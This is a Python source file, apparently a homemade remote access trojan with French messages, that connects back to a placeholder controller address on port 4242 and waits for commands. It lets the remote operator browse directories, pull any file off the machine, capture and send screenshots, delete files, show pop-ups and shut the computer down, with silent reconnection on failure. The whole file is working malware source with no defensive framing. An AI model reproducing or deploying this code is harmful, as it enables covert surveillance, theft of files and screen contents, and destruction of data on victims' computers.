def main():
	import socket
	import os
	import time
	from pyautogui import screenshot, confirm

	time.sleep(1)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = "ip adress here"
	port = 4242
	buffersize = 1024

	def connection():
		try:
			s.connect((host, port))

		except:
			connection()


	def reception():
		
		while True:

			try:
				output=""
				data = s.recv(buffersize)
			    
				if data[:2].decode("utf-8") == "cd":
					try:
						os.chdir(data[3:].decode("utf-8"))
					except os.error as error:
						output = "\n" + str(error) + "\n"


				elif data[:2].decode("utf-8")=="ls":
					dir_files = [(f, os.path.getsize(f)) for f in os.listdir(".")]
					for i in dir_files:
						if os.path.isfile(i[0])==True:
							tipe="File"
						else:
							tipe="Dir"
						output +=tipe + "\t" + i[0] + "..................." + str(i[1]) + "\n"



				elif data[:8].decode("utf-8") == "download":
					try:
						size=0
						filename = data[9:].decode("utf-8")
						filesize = os.path.getsize(filename)
						s.send(f"{filesize}".encode())
					
						f = open(filename, "rb")      

						while size<filesize:
							bytes_read = f.read(buffersize)
							s.send(bytes_read)
							size+=len(bytes_read)
							
						f.close()
						

					except:
						pass

				elif data[:10].decode("utf-8")=="screenshot":
					try:					
						screen = screenshot()
						screen.save(r"screen.png")
						screensize = os.path.getsize("screen.png")
						size=0
						s.send(f"{screensize}".encode())
						f = open("screen.png", "rb")      
					except:
						output="erreur"
					while size<screensize:
						bytes_read = f.read(buffersize)
						s.send(bytes_read)
						size+=len(bytes_read)
						
						
					f.close()
					os.remove("screen.png")
					

				elif data[:6].decode()=="delete":
					try:
						file=data[7:].decode()
						os.remove(file)
						output = "Suppression terminée.\n"
					except OSError as error:
						output = str(error) + "\n"

				elif data[:5].decode()=="mkdir":
					try:
						dos=data[6:].decode()
						os.mkdir(dos)
						output=f"Dossier {dos} créé.\n"
					except OSError as error:
						output=str(error)

				elif data[:3].decode()=="pop":
					try:
						title=s.recv(buffersize).decode()
						message=s.recv(buffersize).decode()
						button=s.recv(buffersize).decode()
						confirm(text=message, title=title, buttons=[button])
						output="Pop-up affiché et cliqué."
					except:
						output="Une erreur est survenue."

				elif data[:8].decode()=="shutdown":
					try:
						os.system('shutdown -s')
						output="Extinction en cours..."
					except OSError as error:
						output=str(error)

					except OSError as error:
						output=str(error)


				elif data[:4].decode()=="exit":    
					main()


				elif data[:4].decode()=="stop":
					quit()


				else:
					output = "Commande inconnue\nTapez 'help' pour afficher l'aide\n"
					
				

				cwd = "\n" + os.getcwd() + ">"
				time.sleep(0.5)
				s.send(bytes("\n" + output + cwd, "utf-8"))
				


			except:
				main()

		

	connection()
	reception()

main()


"""

                      notes additionnelles


"""
